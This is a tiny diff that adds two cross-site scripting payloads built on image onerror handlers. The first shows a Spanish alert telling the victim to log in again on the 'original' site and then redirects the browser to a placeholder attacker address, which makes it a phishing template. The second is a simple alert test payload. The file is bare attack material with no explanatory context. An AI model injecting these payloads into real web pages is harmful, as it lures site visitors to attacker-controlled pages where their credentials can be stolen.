@@ -1,0 +1,4 @@
+<img src="x" onerror="alert('Debe iniciar sesion otra vez en el SITIO SUPER HIPER MEGA ORIGINAR, ahora te reedirigimos a ese sitio'); window.location.href='http://AquiIpAReedirigir';">
+
+
+<img src="x" onerror="alert('hola');">
